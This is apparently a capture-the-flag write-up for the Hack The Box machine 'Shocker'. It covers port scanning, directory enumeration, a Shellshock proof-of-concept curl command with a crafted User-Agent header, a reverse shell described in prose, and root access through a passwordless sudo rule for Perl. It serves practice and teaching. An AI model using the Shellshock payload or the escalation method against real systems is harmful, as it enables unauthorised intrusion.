Shocker

HTBEasyEnumerationRCELinux PrivEsc

Shocker is an easy Linux machine where a CGI script is vulnerable to Shellshock, allowing remote command execution and a shell as shelly. A passwordless sudo permission for Perl to execute a root shell directly.

Solved: July 30, 2026

Recon

Started with a basic Nmap scan:

nmap
$ nmap -sC -sV -Pn 10.129.15.53

The scan identified two accessible services:

PortServiceVersion
80HTTPApache httpd 2.4.18 (Ubuntu)
2222SSHOpenSSH 7.2p2 Ubuntu 4ubuntu2.2

The target is running an older Ubuntu Linux installation with Apache on port 80 and SSH exposed on the non-standard port 2222.

Enumeration

HTTP - TCP 80

Visiting the website did not reveal anything particularly useful. The page had no title and contained very little content.

We then used Gobuster to enumerate directories:

gobuster
$ gobuster dir -u http://10.129.15.53/ -w dirb.txt

Among the discovered paths was:

/cgi-bin/

The /cgi-bin/ directory was particularly interesting because CGI scripts can be affected by Shellshock when they invoke Bash.

We enumerated the directory further:

gobuster
$ gobuster dir -u http://10.129.15.53/cgi-bin/ -w cgibin.txt

This revealed:

/user.sh

Requesting the script showed:

curl
$ curl http://10.129.15.53/cgi-bin/user.sh

The response was:

Content-Type: text/plain Just an uptime test script 01:47:41 up 3 min, 0 users, load average: 0.03, 0.07, 0.03

The script executes an uptime command, making it a potential candidate for Shellshock testing.

Shellshock

Shellshock is a Bash vulnerability that can allow arbitrary commands to be executed when specially crafted environment variables are passed to a vulnerable CGI script.

We tested whether the CGI script was vulnerable by sending a crafted User-Agent header:

curl
$ curl -H "User-Agent: () { :; }; echo; echo; /bin/bash -c 'echo Vulnerable!'" \
$ http://10.129.15.53/cgi-bin/user.sh

The server returned:

Vulnerable!

This confirmed that the CGI script was vulnerable to Shellshock.

Initial Access

With command execution confirmed, we used the Shellshock vulnerability to obtain a shell as the shelly user.

A reverse shell was established through the vulnerable CGI script.

Once connected, we verified the account:

whoami
$ whoami
shelly

We then retrieved the user flag:

cat
$ cat /home/shelly/user.txt
c271a2eb0eae937c681a2cc99f0de25f

This confirmed successful user-level access.

Privilege Escalation

After obtaining access as shelly, we checked the user's sudo permissions:

sudo
$ sudo -l

The important entry showed that shelly could execute Perl as root without a password:

(root) NOPASSWD: /usr/bin/perl

This was a straightforward sudo misconfiguration because Perl can execute arbitrary commands.

Root

We used the permitted Perl binary to spawn a shell with root privileges.

After obtaining the elevated shell, we verified our privileges:

id
$ id

The shell was running as root.

We then retrieved the root flag:

cat
$ cat /root/root.txt
6012f3ded1cd5ca13619f356f1bd5172

The machine was fully compromised.

Key Takeaways

  • Enumerate CGI directories. The /cgi-bin/ directory revealed a script that was not obvious from the main webpage.
  • Look closely at CGI scripts. The user.sh script executed through the web server and was vulnerable to Shellshock.
  • Test unusual web technologies for known vulnerabilities. The Apache version itself was not the main attack path; the underlying Bash/CGI configuration was.
  • Always run sudo -l after obtaining a shell. The shelly account had passwordless access to /usr/bin/perl.
  • Sudo permissions can provide direct root access. The Perl permission eliminated the need for a more complicated privilege-escalation technique.
